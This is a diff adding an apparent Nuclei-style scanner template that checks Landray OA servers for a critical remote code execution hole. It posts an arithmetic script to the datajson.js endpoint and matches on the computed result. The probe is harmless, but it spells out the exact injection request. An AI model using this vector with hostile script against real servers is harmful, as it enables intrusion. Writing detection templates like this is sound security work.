@@ -1,0 +1,23 @@
+id: poc-yaml-landray-oa-datajson-rce
+info:
+  name: 蓝凌OA datajson 命令执行
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/data/sys-common/datajson.js"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "s_bean=sysFormulaSimulateByJS&script=1112*112"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"fdId":124544'
+          - '{"success":true'
